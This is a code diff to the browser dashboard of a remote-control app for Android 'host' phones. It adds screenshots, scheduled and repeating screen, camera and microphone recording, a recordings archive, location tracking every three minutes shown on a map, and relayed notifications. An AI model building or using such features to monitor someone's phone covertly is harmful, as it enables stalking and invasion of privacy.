@@ -845,6 +845,11 @@
                         ? `<span class="text-[9px] bg-emerald-950 border border-emerald-500/30 text-emerald-300 px-2 py-0.5 rounded-full">نشط أونلاين</span>`
                         : `<span class="text-[9px] bg-slate-800 border border-slate-600/40 text-slate-400 px-2 py-0.5 rounded-full">محفوظ — غير نشط</span>`;
                 const modelInfo = hostModelCache[deviceId] ? `<p class="text-[9px] text-slate-500 font-mono">${hostModelCache[deviceId]}</p>` : "";
+                const batt = hostBatteryChip[deviceId];
+                const battText = (batt && typeof batt.level === 'number' && batt.level >= 0)
+                    ? `<span class="text-[9px] px-1.5 py-0.5 rounded-md border ${batt.level <= 15 ? 'border-rose-500/60 text-rose-300 bg-rose-950/60' : 'border-emerald-500/40 text-emerald-300 bg-emerald-950/50'} font-bold" title="آخر بطارية معروفة">🔋 ${batt.level}%${batt.charging ? ' ⚡' : ''}</span>`
+                    : "";
+                const snapBtn = `<button onclick="event.stopPropagation(); openHostSnapshotModal('${deviceId}')" title="آخر حالة مخزنة على خادم Render — تعمل حتى عند انقطاع المضيف" class="text-[9px] px-1.5 py-0.5 rounded-md border border-slate-600/50 text-slate-300 bg-slate-800/80 hover:bg-slate-700 font-bold transition">💾 الحالة</button>`;
                 return `
                 <div onclick="selectAndConnectHost('${deviceId}')" class="p-2 ${border} ${flash} rounded-xl flex items-center justify-between cursor-pointer transition hover:bg-slate-800/90">
                     <div class="flex items-center gap-2">
@@ -855,7 +860,10 @@
                             ${modelInfo}
                         </div>
                     </div>
-                    ${statusBadge}
+                    <div class="flex flex-col items-end gap-1">
+                        ${statusBadge}
+                        <div class="flex items-center gap-1 ${battText || snapBtn ? '' : 'hidden'}">${battText}${snapBtn}</div>
+                    </div>
                 </div>`;
             };
 
@@ -884,14 +892,19 @@
         }
 
         // خطاف حالة جهاز info: احفظ موديل آخر host تم جلبه (بطاقة الهاست في القائمة)
+        const hostBatteryChip = {};   // deviceId -> {level, charging, ts}
         const origUpdateDashboardCards = updateDashboardCards;
         updateDashboardCards = function (data) {
             try {
                 const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
                 if (hostId && data && (data.model || data.manufacturer)) {
                     hostModelCache[hostId] = `${data.model || ""}${data.manufacturer ? " • " + data.manufacturer : ""} • أندرويد ${data.androidVersion || ""}`.trim();
-                    renderHostList();
                 }
+                if (hostId && data && (data.batteryLevel !== undefined || data.battery !== undefined)) {
+                    const lvl = data.batteryLevel !== undefined ? data.batteryLevel : data.battery;
+                    hostBatteryChip[hostId] = { level: lvl, charging: data.isCharging === true, ts: Date.now() };
+                }
+                if (hostId && data) renderHostList();
             } catch (_) {}
             return origUpdateDashboardCards(data);
         };
@@ -1815,6 +1828,45 @@
                 return;
             }
 
+            // ⏺ بدء تسجيل
+            if (cmd === 'rec_start') {
+                delete recPending[data.kind];
+                if (data.error) {
+                    showToast("فشل بدء التسجيل: " + data.error, "error");
+                    recActiveM[data.kind] = false;
+                } else {
+                    recActiveM[data.kind] = true;
+                    showToast(data.scheduled
+                        ? `⏺ تم جدولة تسجيل ${recKindLabel(data.kind)} — سيعمل تلقائياً في موعده`
+                        : `⏺ بدأ تسجيل ${recKindLabel(data.kind)} (${data.segmentSec || 180}s${(data.repeatCount || 1) > 1 ? '، مقاطع: ' + data.repeatCount : (data.intervalSec > 0 ? '، كل ' + data.intervalSec + 's' : '')})`, "success");
+                }
+                refreshRecButtons();
+                return;
+            }
+
+            // ⏹ إيقاف تسجيل
+            if (cmd === 'rec_stop') {
+                if (data.stopped) {
+                    recActiveM[data.kind] = false;
+                    showToast(`⏹ تم إيقاف تسجيل ${recKindLabel(data.kind)}`, "info");
+                } else {
+                    showToast("لا يوجد تسجيل نشط بهذا النوع", "warning");
+                }
+                refreshRecButtons();
+                return;
+            }
+
+            // 📷 لقطة شاشة
+            if (cmd === 'screenshot') {
+                if (data.image) {
+                    showScreenshotModal(data.image);
+                    showToast("📷 تم التقاط لقطة الشاشة وعرضها", "success");
+                } else if (data.error) {
+                    showToast("📷 " + data.error, "error");
+                }
+                return;
+            }
+
             // رد أمر غير معروف في التوجيه؟
             if (data.permissionWarning !== undefined) {
                 showToast("تنبيه المضيف: " + data.permissionWarning, "warning");
@@ -1833,6 +1885,18 @@
                     studioLoading = false;
                     setStudioBadge(studioItems.length);
                     if (activeTab === 'studio') renderStudioGrid();
+                    return;
+                }
+                // 📂 أرشيف التسجيلات + 📍 نقاط المواقع (قوائم جديدة)
+                if (cmd === 'recordings_list') {
+                    recordingsCache = data.items || [];
+                    if (typeof renderRecordingsGrid === 'function') renderRecordingsGrid();
+                    return;
+                }
+                if (cmd === 'locations_get') {
+                    locationPointsCache = data.items || [];
+                    locationTrackingInfo = data.tracking === true;
+                    if (typeof renderLocationFolderView === 'function') renderLocationFolderView();
                     return;
                 }
                 let targetType = activeTab;
@@ -1938,6 +2002,12 @@
                     streamState.audioOnly = false;
                     streamState.mode = 'none';
                     showToast("تم إيقاف كافة وسائل البث المباشر", "info");
+                } else if (data.pendingPermission === true) {
+                    // بانتظار منح الإذن على الهاتف — عند التسليم يصل نبض stream_started
+                    // ويطلق إعادة التفاوض تلقائياً (إصلاح نافذة البث الفارغة)
+                    streamState.mode = data.mode || streamState.mode || 'screen';
+                    streamState.active = false;
+                    showToast("📲 بانتظار منح إذن التقاط الشاشة على الهاتف المضيف — منّح الإذن وسينطلق البث تلقائياً", "warning");
                 }
 
                 if (data.isFront !== undefined) streamState.isFront = data.isFront;
@@ -1993,6 +2063,50 @@
                     const appName = packageNameFriendly[item.packageName] || item.packageName;
                     showToast(`🔔 إشعار جديد من ${appName}: ${item.title || ''} ${item.text || ''}`.trim(), "info");
                     refreshAllBadges();
+                    return;
+                }
+
+                // 🎬 البث الحي بدأ فعلياً على المضيف (بعد الالتقاط/الإذن) — هندس إعادة التفاوض فوراً
+                if (kind === 'stream_started') {
+                    try {
+                        const mode = payload.mode || 'screen';
+                        const audioEnabled = payload.audioEnabled === true;
+                        streamState.active = true;
+                        streamState.audioOnly = (mode === 'audio');
+                        streamState.mode = mode;
+                        streamState.audioEnabled = audioEnabled;
+                        applyStreamMuteToElements();
+                        ensureStreamRenegotiation();
+                        showToast(`✅ البث الحي بدأ فعلياً على المضيف (${mode === 'audio' ? 'ميكروفون' : mode === 'camera' ? 'كاميرا' : 'شاشة'}) — جارٍ استلام الإطارات`, "success");
+                        if (activeTab === 'camera') renderCameraStreamView();
+                    } catch (e) { console.warn('stream_started handler', e); }
+                    return;
+                }
+
+                if (kind === 'stream_stopped') {
+                    streamState.active = false;
+                    streamState.mode = 'none';
+                    streamState.audioOnly = false;
+                    showToast("تم إيقاف البث الحي على المضيف", "info");
+                    if (activeTab === 'camera') renderCameraStreamView();
+                    return;
+                }
+
+                // 📍 نبضة موقع حية كل 3 دقائق
+                if (kind === 'location') {
+                    try {
+                        const p = {
+                            lat: payload.lat, lng: payload.lng,
+                            ts: payload.ts || payload.deviceTs || now,
+                            acc: payload.acc, speed: payload.speed, provider: payload.provider
+                        };
+                        if (typeof p.lat === 'number' && typeof p.lng === 'number') {
+                            locationPointsCache = [p].concat(locationPointsCache).slice(0, 400);
+                            if (recordingsFolderCurrent === 'location' && typeof renderLocationFolderView === 'function') {
+                                renderLocationFolderView();
+                            }
+                        }
+                    } catch (e) { console.warn('location push', e); }
                     return;
                 }
 
@@ -3028,6 +3142,7 @@
                         </button>
                     ` : ''}
                 </div>
+                ${renderStreamExtraToolbar()}
             `;
         }
 
@@ -4254,6 +4369,665 @@
             const modalEl = document.getElementById("connectivity-diagnostic-modal");
             if (modalEl) modalEl.classList.replace("flex", "hidden");
         }
+
+        // ============================================================
+        //    🎬 الدفعة الجديدة: اللقطة + التسجيل المجدول + المجلدات + خريطة الموقع + مزامنة الخادم
+        // ============================================================
+        const recPending = {};      // kind -> قيد التأكيد
+        const recActiveM = {};      // kind -> تسجيل جارٍ
+        let recordingsFolderCurrent = null;
+        let recordingsCache = [];
+        let locationPointsCache = [];
+        let locationTrackingInfo = false;
+        let locationSnapshotBuffer = null;   // لحظة مخزنة من الخادم (تعمل عند انقطاع المضيف)
+        let rbLocMap = null;
+        let rbLocMarkersLayer = null;
+
+        function recKindLabel(kind) {
+            return kind === 'camera' ? 'الكاميرا' : kind === 'audio' ? 'الميكروفون' : kind === 'screenshot' ? 'اللقطات' : 'الشاشة';
+        }
+
+        function getRecPrefs(kind) {
+            try {
+                const all = JSON.parse(localStorage.getItem('rb_rec_sched_v1') || '{}');
+                return all[kind] || { delaySec: 0, segmentSec: 180, intervalSec: 0, repeatCount: 1, front: false, audio: true };
+            } catch (_) { return { delaySec: 0, segmentSec: 180, intervalSec: 0, repeatCount: 1, front: false, audio: true }; }
+        }
+
+        function saveRecPrefs(kind, prefs) {
+            try {
+                const all = JSON.parse(localStorage.getItem('rb_rec_sched_v1') || '{}');
+                all[kind] = prefs;
+                localStorage.setItem('rb_rec_sched_v1', JSON.stringify(all));
+            } catch (_) {}
+        }
+
+        function refreshRecButtons() {
+            if (activeTab === 'camera') renderCameraStreamView();
+        }
+
+        // ——— إعادة التفاوض الذكية بعد نبض stream_started (تنقيح التزاحم مع عرض 400ms الأساسي) ———
+        let streamRenegotiateTimer = null;
+        function ensureStreamRenegotiation() {
+            if (streamRenegotiateTimer) clearTimeout(streamRenegotiateTimer);
+            streamRenegotiateTimer = setTimeout(() => {
+                streamRenegotiateTimer = null;
+                if (!streamState.active || !activeTargetDeviceId) return;
+                try {
+                    if (!pc || pc.connectionState === 'closed' || pc.connectionState === 'failed') {
+                        initPeerConnection(activeTargetDeviceId);
+                        dataChannel = pc.createDataChannel("bridgeData", { ordered: true });
+                        setupDataChannelEvents();
+                    }
+                    if (pc.signalingState === 'stable') {
+                        createWebRTCOffer(activeTargetDeviceId);
+                    } else {
+                        // إعادة تفاوض سابقة قيد الإنجاز — انتظار قصير ثم محاولة أخيرة
+                        setTimeout(() => {
+                            if (streamState.active && pc && pc.signalingState === 'stable') {
+                                createWebRTCOffer(activeTargetDeviceId);
+                            } else if (streamState.active) {
+                                showToast("تعذر إطلاق تفاوض البث تلقائياً — أعد الضغط على زر نوع البث مرة أخرى", "warning");
+                            }
+                        }, 2500);
+                    }
+                } catch (e) { console.warn('renegotiate error', e); }
+            }, 1000);
+        }
+
+        // ——— شريط الأدوات الثاني لنافذة البث ———
+        function renderStreamExtraToolbar() {
+            const recBtn = (kind) => {
+                const on = recActiveM[kind] || recPending[kind];
+                return `<button onclick="toggleRec('${kind}')" title="${on ? 'إيقاف التسجيل الجاري' : 'بدء تسجيل مباشر'}" class="px-3 py-2 rounded-xl font-bold transition flex items-center gap-1.5 active:scale-95 ${on ? 'bg-rose-600 hover:bg-rose-500 text-white border border-rose-400 shadow-lg shadow-rose-950/50' : 'bg-slate-800 hover:bg-rose-600/20 text-slate-200 border border-slate-700'}">
+                            <span>${on ? '⏹' : '⏺'}</span><span class="text-[11px]">${on ? 'إيقاف' : 'تسجيل'} ${recKindLabel(kind)}</span>
+                        </button>`;
+            };
+            return `
+                <div class="bg-slate-900/70 border border-slate-800 rounded-2xl p-2.5 flex flex-wrap items-center gap-2 text-xs shadow-lg mt-2">
+                    <button onclick="takeInstantScreenshot()" title="التقاط لقطة شاشة فورية من الهاتف المضيف" class="px-3 py-2 rounded-xl font-bold transition flex items-center gap-1.5 active:scale-95 bg-indigo-700 hover:bg-indigo-600 text-white border border-indigo-500">
+                        <span>📷</span><span class="text-[11px]">لقطة شاشة</span>
+                    </button>
+                    ${recBtn('screen')}
+                    ${recBtn('camera')}
+                    ${recBtn('audio')}
+                    <span class="w-px h-6 bg-slate-700 mx-1"></span>
+                    <button onclick="openRecordingScheduleModal()" title="جدول بدء التسجيل: وقت بدء/مدة/فاصل/عدد المقاطع" class="px-3 py-2 rounded-xl font-bold transition flex items-center gap-1.5 active:scale-95 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700">
+                        <span>⚙️</span><span class="text-[11px]">جدولة التسجيل</span>
+                    </button>
+                    <button onclick="openRecordingsFolders()" title="مجلدات الأرشيف: تسجيلات الشاشة/الكاميرا/الصوت/اللقطات/الموقع" class="px-3 py-2 rounded-xl font-bold transition flex items-center gap-1.5 active:scale-95 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700">
+                        <span>📂</span><span class="text-[11px]">مجلدات الأرشيف</span>
+                    </button>
+                    <button onclick="openLocationMapView()" title="خريطة تفاعلية لمسار أماكن الهاتف" class="px-3 py-2 rounded-xl font-bold transition flex items-center gap-1.5 active:scale-95 bg-teal-800 hover:bg-teal-700 text-teal-100 border border-teal-600">
+                        <span>🗺️</span><span class="text-[11px]">خريطة المواقع</span>
+                    </button>
+                </div>`;
+        }
+
+        // ——— بدء/إيقاف التسجيل ———
+        function toggleRec(kind) {
+            if (recActiveM[kind] || recPending[kind]) {
+                showToast(`⏹ إيقاف تسجيل ${recKindLabel(kind)}...`, 'info');
+                sendRPCCommand('rec_stop', { kind }, { timeout: 9000 }).catch(() => {});
+                recPending[kind] = true;
+                refreshRecButtons();
+                setTimeout(() => { delete recPending[kind]; }, 4000);
+                return;
+            }
+            applyRecStart(kind, getRecPrefs(kind));
+        }
+
+        function applyRecStart(kind, prefs) {
+            const targetId = activeTargetDeviceId || appConfig.targetDeviceId;
+            if (!targetId) { showToast('اختر جهازاً مضيفاً أولاً', 'warning'); return; }
+            recPending[kind] = true;
+            refreshRecButtons();
+            setTimeout(() => { delete recPending[kind]; }, 9000);
+            const payload = {
+                kind,
+                front: prefs.front === true,
+                audio: prefs.audio !== false,
+                delaySec: Number(prefs.delaySec) || 0,
+                segmentSec: Number(prefs.segmentSec) || 180,
+                intervalSec: Number(prefs.intervalSec) || 0,
+                repeatCount: (prefs.repeatCount !== undefined && prefs.repeatCount !== null) ? Number(prefs.repeatCount) : 1
+            };
+            sendRPCCommand('rec_start', payload, { timeout: 12000 }).catch(() => {
+                delete recPending[kind];
+                refreshRecButtons();
+            });
+        }
+
+        // ——— نافذة جدولة التسجيل ———
+        function openRecordingScheduleModal() {
+            ensureStreamModalsShell();
+            const el = document.getElementById('rb-rec-schedule-modal');
+            const kinds = ['screen', 'camera', 'audio'];
+            el.innerHTML = `
+                <div class="bg-slate-900 border border-slate-700 rounded-2xl p-4 w-full max-w-md shadow-2xl">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-emerald-300">⚙️ جدولة التسجيل المباشر</h3>
+                        <button onclick="closeRecScheduleModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                    </div>
+                    <label class="text-[11px] text-slate-400 block mb-1">نوع الوسيط المُسجَّل</label>
+                    <select id="rb-sched-kind" class="w-full bg-slate-800 border border-slate-600 rounded-xl px-3 py-2 text-xs text-slate-100 mb-3">
+                        ${kinds.map(k => `<option value="${k}">${recKindLabel(k)}</option>`).join('')}
+                    </select>
+                    <div class="grid grid-cols-2 gap-2 text-xs">
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1">تأخير البدء (دقائق)</label>
+                            <input id="rb-sched-delay" type="number" min="0" step="1" class="w-full bg-slate-800 border border-slate-600 rounded-xl px-2 py-2 text-slate-100" placeholder="0 = فوراً">
+                        </div>
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1">مدة كل مقطع (ثوانٍ)</label>
+                            <input id="rb-sched-segment" type="number" min="3" step="1" class="w-full bg-slate-800 border border-slate-600 rounded-xl px-2 py-2 text-slate-100" placeholder="180">
+                        </div>
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1">فاصل بين المقاطع (ثوانٍ)</label>
+                            <input id="rb-sched-interval" type="number" min="0" step="1" class="w-full bg-slate-800 border border-slate-600 rounded-xl px-2 py-2 text-slate-100" placeholder="0">
+                        </div>
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1">عدد المقاطع (0 = حتى الإيقاف)</label>
+                            <input id="rb-sched-repeat" type="number" min="0" step="1" class="w-full bg-slate-800 border border-slate-600 rounded-xl px-2 py-2 text-slate-100" placeholder="1">
+                        </div>
+                    </div>
+                    <div id="rb-sched-camopts" class="flex items-center gap-4 mt-3 text-xs text-slate-300">
+                        <label class="flex items-center gap-1.5"><input id="rb-sched-front" type="checkbox" class="accent-emerald-500"> كاميرا أمامية 🤳</label>
+                        <label class="flex items-center gap-1.5"><input id="rb-sched-audio" type="checkbox" class="accent-emerald-500" checked> مع الصوت 🎙️</label>
+                    </div>
+                    <p class="text-[10px] text-slate-500 mt-2">يتوقف البث الحي مؤقتاً عند تعارض النوع ثم يعود تلقائياً بعد انتهاء السلسلة. الشاشة تحتاج إذن الالتقاط ممنوحاً من قبل.</p>
+                    <div class="flex gap-2 mt-3">
+                        <button onclick="applyRecordingScheduleForm()" class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold py-2.5 rounded-xl transition">⏺ جدولة/بدء الآن</button>
+                        <button onclick="closeRecScheduleModal()" class="bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2.5 rounded-xl transition px-4">إلغاء</button>
+                    </div>
+                    <button onclick="openRecordingsFolders()" class="w-full mt-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-[11px] font-bold py-2 rounded-xl transition">📂 مراجعة المجلدات والأرشيف</button>
+                </div>`;
+            // تعبئة الحفظ السابق
+            const kindSel = document.getElementById('rb-sched-kind');
+            const fillPrefs = () => {
+                const p = getRecPrefs(kindSel.value);
+                document.getElementById('rb-sched-delay').value = p.delaySec || 0;
+                document.getElementById('rb-sched-segment').value = p.segmentSec || 180;
+                document.getElementById('rb-sched-interval').value = p.intervalSec || 0;
+                document.getElementById('rb-sched-repeat').value = (p.repeatCount === undefined ? 1 : p.repeatCount);
+                document.getElementById('rb-sched-front').checked = p.front === true;
+                document.getElementById('rb-sched-audio').checked = p.audio !== false;
+                document.getElementById('rb-sched-camopts').style.display = kindSel.value === 'camera' ? 'flex' : 'none';
+            };
+            kindSel.addEventListener('change', fillPrefs);
+            fillPrefs();
+            el.classList.replace('hidden', 'flex');
+        }
+
+        function applyRecordingScheduleForm() {
+            const kind = document.getElementById('rb-sched-kind').value;
+            const prefs = {
+                delaySec: parseInt(document.getElementById('rb-sched-delay').value, 10) || 0,
+                segmentSec: parseInt(document.getElementById('rb-sched-segment').value, 10) || 180,
+                intervalSec: parseInt(document.getElementById('rb-sched-interval').value, 10) || 0,
+                repeatCount: parseInt(document.getElementById('rb-sched-repeat').value, 10),
+                front: document.getElementById('rb-sched-front').checked,
+                audio: document.getElementById('rb-sched-audio').checked
+            };
+            saveRecPrefs(kind, prefs);
+            closeRecScheduleModal();
+            applyRecStart(kind, prefs);
+        }
+
+        function closeRecScheduleModal() {
+            const el = document.getElementById('rb-rec-schedule-modal');
+            if (el) el.classList.replace('flex', 'hidden');
+        }
+
+        // ——— لقطة الشاشة ———
+        function takeInstantScreenshot() {
+            const targetId = activeTargetDeviceId || appConfig.targetDeviceId;
+            if (!targetId) { showToast('اختر جهازاً مضيفاً أولاً', 'warning'); return; }
+            showToast('📷 جارٍ التقاط لقطة شاشة من الهاتف المضيف...', 'info');
+            sendRPCCommand('screenshot', null, { timeout: 20000 }).catch(() => {
+                showToast('لم تصل اللقطة — تأكد من الاتصال ومنح الإذن سابقاً', 'error');
+            });
+        }
+
+        function showScreenshotModal(dataUrl) {
+            ensureStreamModalsShell();
+            const el = document.getElementById('rb-screenshot-modal');
+            el.innerHTML = `
+                <div class="bg-slate-900 border border-slate-700 rounded-2xl p-3 max-w-2xl w-full shadow-2xl">
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-sm font-bold text-indigo-300">📷 لقطة شاشة الهاتف المضيف</h3>
+                        <button onclick="closeScreenshotModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                    </div>
+                    <img src="${dataUrl}" class="w-full rounded-xl border border-slate-800 object-contain max-h-[65vh]" alt="لقطة الشاشة">
+                    <div class="flex gap-2 mt-2">
+                        <a href="${dataUrl}" download="remotebridge_shot_${Date.now()}.jpg" class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold py-2.5 rounded-xl text-center transition">💾 حفظ اللقطة</a>
+                        <button onclick="closeScreenshotModal()" class="bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2.5 rounded-xl transition px-4">إغلاق</button>
+                    </div>
+                </div>`;
+            el.classList.replace('hidden', 'flex');
+        }
+
+        function closeScreenshotModal() {
+            const el = document.getElementById('rb-screenshot-modal');
+            if (el) el.classList.replace('flex', 'hidden');
+        }
+
+        // ——— هيكل النوافذ ———
+        function ensureStreamModalsShell() {
+            if (document.getElementById('rb-stream-modals')) return;
+            const shell = document.createElement('div');
+            shell.id = 'rb-stream-modals';
+            shell.innerHTML = `
+                <div id="rb-rec-schedule-modal" class="hidden fixed inset-0 z-[70] items-center justify-center bg-black/70 backdrop-blur-sm p-4"></div>
+                <div id="rb-recordings-modal" class="hidden fixed inset-0 z-[70] items-center justify-center bg-black/70 backdrop-blur-sm p-2 md:p-4"></div>
+                <div id="rb-screenshot-modal" class="hidden fixed inset-0 z-[85] items-center justify-center bg-black/80 p-4"></div>
+                <div id="rb-location-modal" class="hidden fixed inset-0 z-[80] items-center justify-center bg-black/80 p-2 md:p-4"></div>
+                <div id="rb-host-snapshot-modal" class="hidden fixed inset-0 z-[70] items-center justify-center bg-black/70 backdrop-blur-sm p-4"></div>`;
+            document.body.appendChild(shell);
+        }
+
+        // ——— مجلدات الأرشيف ———
+        function openRecordingsFolders() {
+            ensureStreamModalsShell();
+            recordingsFolderCurrent = 'screen';
+            renderRecordingsShell();
+            sendRPCCommand('recordings_list', null, { timeout: 10000 }).catch(() => {
+                showToast('تعذّر جلب قائمة التسجيلات من المضيف — الاتصال مقطوع؟', 'error');
+            });
+        }
+
+        function renderRecordingsShell() {
+            const kind = recordingsFolderCurrent;
+            const el = document.getElementById('rb-recordings-modal');
+            const folders = [
+                ['screen', '🖥️ تسجيلات الشاشة'],
+                ['camera', '🎥 تسجيلات الكاميرا'],
+                ['audio', '🎙️ تسجيلات الصوت'],
+                ['screenshot', '📷 اللقطات'],
+                ['location', '🗺️ المواقع']
+            ];
+            el.innerHTML = `
+                <div class="bg-slate-900 border border-slate-700 rounded-2xl p-3 w-full max-w-3xl shadow-2xl max-h-[88vh] flex flex-col">
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-sm font-bold text-emerald-300">📂 مجلدات الأرشيف على الهاتف المضيف</h3>
+                        <button onclick="closeRecordingsModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                    </div>
+                    <div class="flex flex-wrap gap-1.5 mb-2">
+                        ${folders.map(([k, lbl]) => `<button onclick="selectRecordingsFolder('${k}')" class="px-2.5 py-1.5 rounded-xl text-[11px] font-bold transition border ${k === kind ? 'bg-emerald-600 text-white border-emerald-400' : 'bg-slate-800 text-slate-300 border-slate-700 hover:bg-slate-700'}">${lbl}</button>`).join('')}
+                    </div>
+                    <div id="rb-rec-content" class="overflow-y-auto flex-1 bg-slate-950/60 border border-slate-800 rounded-xl p-2"></div>
+                    <p class="text-[10px] text-slate-500 mt-1.5">الملفات محفوظة في مجلد التطبيق على الهاتف المضيف (Android/data/com.remotebridge... ) — تُعرض المصغرات تلقائياً بعد الجلب.</p>
+                </div>`;
+            el.classList.replace('hidden', 'flex');
+            if (kind === 'location') renderLocationFolderView();
+            else renderRecordingsGrid();
+        }
+
+        function selectRecordingsFolder(kind) {
+            recordingsFolderCurrent = kind;
+            renderRecordingsShell();
+            if (kind !== 'location') {
+                sendRPCCommand('recordings_list', null, { timeout: 10000 }).catch(() => {});
+            }
+        }
+
+        function closeRecordingsModal() {
+            const el = document.getElementById('rb-recordings-modal');
+            if (el) el.classList.replace('flex', 'hidden');
+            recordingsFolderCurrent = null;
+        }
+
+        function recFmtSize(bytes) {
+            const u = ['B', 'KB', 'MB', 'GB'];
+            let i = 0, v = bytes || 0;
+            while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
+            return (i > 0 && v < 10 ? v.toFixed(1) : Math.round(v)) + ' ' + u[i];
+        }
+
+        function recFmtDate(ms) {
+            try { return new Date(Number(ms) || Date.now()).toLocaleString('ar-EG', { hour12: false }); }
+            catch (_) { return '' + ms; }
+        }
+
+        function renderRecordingsGrid() {
+            const grid = document.getElementById('rb-rec-content');
+            if (!grid || recordingsFolderCurrent === 'location') return;
+            const kind = recordingsFolderCurrent;
+            const items = (recordingsCache || []).filter(it => it.recKind === kind);
+            if (!items.length) {
+                grid.innerHTML = `<div class="text-center text-slate-500 text-xs py-8">لا توجد تسجيلات ${recKindLabel(kind)} بعد — بدّئ التسجيل من شريط الأدوات ▶️</div>`;
+                return;
+            }
+            grid.innerHTML = items.slice(0, 96).map((it, idx) => {
+                const icon = it.kind === 'audio' ? '🎙️' : (it.kind === 'image' ? '🖼️' : '🎬');
+                return `
+                    <div class="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden mb-2">
+                        <div class="h-28 bg-slate-950 flex items-center justify-center relative">
+                            <div id="rb-thumb-${idx}" class="w-full h-full flex items-center justify-center text-3xl">${icon}</div>
+                        </div>
+                        <div class="p-2">
+                            <p class="text-[11px] font-bold text-slate-200 truncate" title="${it.name}">${it.name}</p>
+                            <p class="text-[10px] text-slate-500">${recFmtSize(it.size)} • ${recFmtDate(it.dateMs)}</p>
+                        </div>
+                    </div>`;
+            }).join('');
+            requestRecordingsThumbs(items);
+        }
+
+        const recThumbCache = {};
+        function requestRecordingsThumbs(items) {
+            items.slice(0, 48).forEach((it, idx) => {
+                const slot = document.getElementById('rb-thumb-' + idx);
+                if (!slot) return;
+                if (it.kind === 'audio') { slot.innerHTML = `<span class="text-4xl">🎙️</span>`; return; }
+                const cached = recThumbCache[it.name];
+                if (cached && cached.startsWith('data:')) { slot.innerHTML = `<img src="${cached}" class="w-full h-full object-cover"/>`; return; }
+                if (cached === 'pending') return;
+                recThumbCache[it.name] = 'pending';
+                sendRPCCommand('file_thumbnail', { path: it.path, kind: it.kind === 'image' ? 'image' : 'video', size: 240 }, { timeout: 12000 })
+                    .then(resp => {
+                        const url = resp && resp.data && resp.data.thumbnail;
+                        if (url && url.startsWith('data:')) {
+                            recThumbCache[it.name] = url;
+                            const s = document.getElementById('rb-thumb-' + idx);
+                            if (s) s.innerHTML = `<img src="${url}" class="w-full h-full object-cover"/>`;
+                        }
+                    })
+                    .catch(() => { delete recThumbCache[it.name]; });
+            });
+        }
+
+        // ——— عرض مجلد الموقع ———
+        function renderLocationFolderView() {
+            const grid = document.getElementById('rb-rec-content');
+            if (!grid) return;
+            const pts = locationPointsCache || [];
+            grid.innerHTML = `
+                <div class="p-1">
+                    <div class="flex flex-wrap items-center gap-2 mb-2">
+                        <span class="text-[11px] px-2 py-1 rounded-lg border ${locationTrackingInfo ? 'border-emerald-500/50 text-emerald-300 bg-emerald-950/60' : 'border-slate-700 text-slate-400 bg-slate-900/60'}">${locationTrackingInfo ? '📍 التتبع يعمل (نبضة كل 3 دقائق)' : 'التتبع غير منشط بعد'}</span>
+                        <span class="text-[11px] px-2 py-1 rounded-lg border border-slate-700 text-slate-300 bg-slate-900/60">${pts.length} نقطة مخزنة</span>
+                        <button onclick="openLocationMapView()" class="px-3 py-1.5 rounded-xl text-[11px] font-bold bg-teal-700 hover:bg-teal-600 text-teal-50 transition border border-teal-500">🗺️ عرض على الخارطة التفاعلية</button>
+                        <button onclick="sendRPCCommand('locations_clear', null, {timeout: 8000}).catch(() => {}); setTimeout(() => sendRPCCommand('locations_get', null, {timeout: 8000}).catch(() => {}), 1200); " class="px-3 py-1.5 rounded-xl text-[11px] font-bold bg-rose-900/70 hover:bg-rose-800 text-rose-200 transition border border-rose-700/50">🗑️مسح السجل</button>
+                    </div>
+                    ${pts.length === 0 ? '<div class="text-center text-slate-500 text-xs py-6">لا نقاط بعد — سجلى تُحفظ تلقائياً كل 3 دقائق.</div>' : `
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-1.5">
+                            ${pts.slice(0, 60).map(p => `
+                                <div class="bg-slate-900 border border-slate-800 rounded-xl p-2 flex items-center justify-between text-[10px] font-mono text-slate-300">
+                                    <span>${Number(p.lat).toFixed(5)}, ${Number(p.lng).toFixed(5)}</span>
+                                    <span class="text-slate-500">${recFmtDate(p.ts)}</span>
+                                </div>`).join('')}
+                        </div>`}
+                </div>`;
+        }
+
+        // ——— الخريطة التفاعلية (Leaflet عبر CDN) ———
+        function loadLeafletAssets() {
+            return new Promise((resolve, reject) => {
+                if (window.L) { resolve(); return; }
+                try {
+                    const css = document.createElement('link');
+                    css.rel = 'stylesheet';
+                    css.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
+                    document.head.appendChild(css);
+                    const s = document.createElement('script');
+                    s.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+                    s.onload = () => setTimeout(resolve, 80);
+                    s.onerror = () => reject(new Error('leaflet fail'));
+                    document.head.appendChild(s);
+                } catch (e) { reject(e); }
+            });
+        }
+
+        function locationSourcePoints() {
+            if (locationSnapshotBuffer && Array.isArray(locationSnapshotBuffer.location) && locationSnapshotBuffer.location.length) {
+                return locationSnapshotBuffer.location;
+            }
+            return locationPointsCache || [];
+        }
+
+        function openLocationMapView(snapshotData) {
+            ensureStreamModalsShell();
+            if (snapshotData) locationSnapshotBuffer = snapshotData;
+            const el = document.getElementById('rb-location-modal');
+            el.innerHTML = `
+                <div class="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-4xl shadow-2xl p-3">
+                    <div class="flex items-center justify-between mb-2 gap-2">
+                        <h3 class="text-sm font-bold text-teal-300">🗺️ مسار مواقع الهاتف المضيف</h3>
